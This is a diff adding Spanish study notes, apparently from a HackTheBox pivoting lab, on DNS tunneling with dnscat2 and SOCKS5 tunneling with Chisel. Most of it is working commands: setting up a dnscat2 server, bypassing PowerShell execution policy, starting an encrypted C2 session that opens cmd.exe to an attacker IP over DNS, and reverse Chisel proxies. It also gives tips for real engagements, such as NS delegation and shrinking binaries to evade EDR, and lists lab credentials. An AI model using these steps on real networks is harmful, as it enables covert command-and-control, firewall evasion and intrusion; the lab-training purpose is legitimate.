@@ -939,3 +939,179 @@ xfreerdp /v:10.129.15.150:8080
 ```powershell
 netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.15.150
 ```
+### Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)
+
+# DNS Tunneling with DNScat2
+
+>[!Important]
+>Cuando el firewall bloquea casi todo, pero el DNS (puerto 53) siempre esta permitido
+## Flujo general
+
+En vez de pedir resolución de nombres real, **mete datos arbitrarios dentro de registros DNS tipo TXT**, creando un canal de **Command & Control (C2) cifrado** que viaja disfrazado de tráfico DNS legítimo. Es una técnica de **exfiltración/tunneling extremadamente sigilosa**, porque muchos firewalls que sí inspeccionan y bloquean HTTPS sospechoso dejan pasar el DNS sin cuestionarlo.
+
+```txt
+[Windows objetivo] ──consultas DNS "falsas" (TXT)──► [DNS local corporativo] ──► [Servidor dnscat2 (tu atacante)]
+```
+El DNS local de la organización cree que está resolviendo nombres normales, pero en realidad está actuando de intermediario inconsciente para tu canal C2.
+## Preparar el servidor en tu atacante
+
+```shell
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
+## Levantar el servidor
+
+```shell
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=ayelaldo.local --no-cache
+```
+
+>[!Important]
+>`host=` es la **IP de tu propio atacante** (donde corre este servidor dnscat2), no la IP del DNS real del objetivo. `domain=` es un **nombre arbitrario que tu elijes**, no algo que haya que sacar del entorno victima — solo tiene que coincidir con el que uses despues en el cliente.
+
+>[!Note]
+>**Modo directo (sin DNS real de por medio):** el cliente conecta por UDP/53 directo a tu IP (`-DNSserver <IP_atacante>`), sin que ningun DNS real resuelva nada. Es el modo usado en labs de HTB, donde hay conectividad directa entre el objetivo y tu maquina.
+>
+>**Modo con delegacion NS real:** para un engagement real a traves de internet, donde el objetivo solo puede salir por su DNS corporativo (no te alcanza por UDP/53 directo), necesitas un dominio propio con un registro NS que delegue un subdominio hacia tu servidor dnscat2. Asi, cuando el cliente pregunta por ese subdominio, el DNS del objetivo reenvia la consulta en cascada hasta llegar a tu servidor, sin que el firewall vea nada raro mas que trafico DNS saliente normal.
+## El cliente en el Windows objetivo
+
+Para no depender de compilar el cliente nativo de dnscat2, se usa **dnscat2-powershell**, una reimplementación en PowerShell compatible:
+
+```bash
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+```
+
+>[!Important]
+>Transfieres `dnscat2.ps1` al objetivo (por el medio que tengas: SMB, HTTP, lo que sea) y lo importas:
+
+>[!Note]
+>Antes de importar cualquier script `.ps1` de terceros en Windows, casi siempre hace falta este paso previo, porque la politica de ejecucion por defecto bloquea scripts no firmados:
+
+```powershell
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+Import-Module .\dnscat2.ps1
+```
+### Inicio de conexión
+
+```powershell
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+```
+ 
+- `-DNSserver`: la IP de tu servidor dnscat2 (si puedes contactarlo directo por UDP 53; si no, el tráfico pasaría primero por el DNS corporativo real, que a su vez reenvía hacia tu dominio autoritativo).
+- `-Domain`: el dominio que configuraste del lado del servidor, necesario para que las consultas DNS lleguen correctamente enrutadas hasta tu servidor (en vez de conectar directo por IP).
+- `-PreSharedSecret`: la clave generada en el paso 2 — **crítico**: sin ella la sesión no se cifra ni se verifica.
+- `-Exec cmd`: le dice al cliente que, una vez establecido el túnel, abra inmediatamente una sesión de línea de comandos (`cmd.exe`) a través de él.
+### Confirmación de la sesión
+
+```
+Session 1 Security: ENCRYPTED AND VERIFIED!
+```
+
+Esto confirma que el secreto compartido coincidió en ambos lados — la sesión está cifrada y autenticada, no es solo un canal DNS en claro.
+### Interactuar con la sesión desde la consola de dnscat2
+
+```
+dnscat2> ?          # lista comandos disponibles (echo, kill, set, start, stop, tunnels, window, etc.)
+dnscat2> window -i 1   # entra a la sesión interactiva número 1
+```
+
+Una vez dentro, cualquier cosa que escribas se envía **tal cual** al cliente Windows, y su salida se muestra en tu pantalla — es efectivamente una shell interactiva (`C:\Windows\system32>`), pero todo el tráfico de ida y vuelta viaja empaquetado dentro de registros DNS TXT.
+## Exercise
+
+```shell
+# === SERVIDOR (atacante) ===
+
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+
+sudo ruby dnscat2.rb --dns host=10.10.15.169,port=53,domain=ayelaldo.local --no-cache
+
+# === CLIENTE (Windows objetivo) ===
+
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+# transferir dnscat2.ps1 al objetivo
+
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+Import-Module .\dnscat2.ps1
+
+Start-Dnscat2 -DNSserver 10.10.15.169 -Domain ayelaldo.local -PreSharedSecret 2a943792a00331c8ec985147326de16e -Exec cmd
+
+# === INTERACTUAR (consola dnscat2, lado servidor) ===
+
+?
+window -i 1
+```
+# SOCKS5 Tunneling with Chisel
+
+**Chisel** logra el mismo resultado que `ssh -D` + `proxychains` (un proxy SOCKS5 hacia la red interna), pero sin necesitar un **servidor SSH real** en el pivote. Es un binario autónomo escrito en Go que tuneliza TCP/UDP sobre HTTP, asegurado con SSH por debajo — útil cuando el pivote no tiene (o no quieres usar) un servicio SSH expuesto.
+## Compilar el binario en el atacante
+
+```shell
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+CGO_ENABLED=0 go build -o chisel
+```
+
+>[!Important]
+>`CGO_ENABLED=0` es **critico**: fuerza un binario completamente estatico. Si compilas con CGo activado (el default), el binario queda linkeado contra la `glibc` de tu propio sistema, y al ejecutarlo en el pivote puede fallar con `version GLIBC_x.xx not found` si el pivote tiene una version de glibc distinta (mas vieja, tipicamente). Verifica la version de glibc del pivote con:
+>```shell
+>ldd --version
+>```
+
+>[!Note]
+>**Alternativa si no puedes recompilar:** usa un binario **prebuilt** de una version anterior desde la seccion *Releases* del repo de GitHub de Chisel, compilado contra una glibc mas antigua y por tanto mas compatible con pivotes viejos.
+>
+>**Cliente y servidor deben ser exactamente la misma version de Chisel.** Si al ejecutar en el objetivo da error de protocolo/compatibilidad, prueba con otra version en ambos lados.
+## Transferir el binario al pivote
+
+```shell
+scp chisel ubuntu@10.129.202.64:~/
+```
+
+>[!Warning]
+>Antes de subir el binario a un objetivo real, conviene considerar su **tamano**: no solo por rendimiento, tambien porque un binario mas chico llama menos la atencion de EDR/analisis forense. Recursos recomendados sobre esto: el post de Oxdf *"Tunneling with Chisel and SSF"* y el walkthrough de IppSec de la maquina **Reddish** (minuto 24:29), donde explica como reducir el tamano del binario.
+## Modo normal (puedes alcanzar al pivote desde afuera)
+
+El servidor corre en el pivote y escucha; el cliente, en tu atacante, se conecta hacia el.
+#### Servidor, en el pivote
+
+```shell
+./chisel server -v -p 1234 --socks5
+```
+#### Cliente, en el atacante
+
+```shell
+./chisel client -v 10.129.202.64:1234 socks
+```
+## Modo reverse (el firewall bloquea conexiones entrantes hacia el pivote)
+
+Cuando no puedes alcanzar al pivote desde afuera (NAT, firewall restrictivo), invertimos los roles: el servidor pasa a correr en tu atacante (escuchando pasivamente) y el cliente, en el pivote, es quien **inicia la conexion saliente** hacia ti.
+#### Servidor, ahora en el atacante
+
+```shell
+sudo ./chisel server --reverse -v -p 1234 --socks5
+```
+#### Cliente, en el pivote
+
+```shell
+./chisel client -v 10.10.14.18:1234 R:socks
+```
+
+>[!Important]
+>El flag **`R:`** antes de `socks` es lo que invierte la direccion del tunel: sin el, el cliente pediria un socks normal (saliente desde el, hacia donde el decida). Con `R:socks`, el cliente le dice al servidor "abre tu SOCKS5 del lado tuyo (atacante), y yo (pivote) te sirvo de transporte" — exactamente el mismo concepto que un `ssh -R` pero sin SSH real de por medio.
+## Configurar proxychains (en ambos modos)
+
+```shell
+# al final de /etc/proxychains.conf
+socks5 127.0.0.1 1080
+```
+## Verificar y usar
+
+```shell
+tail -f /etc/proxychains.conf
+
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
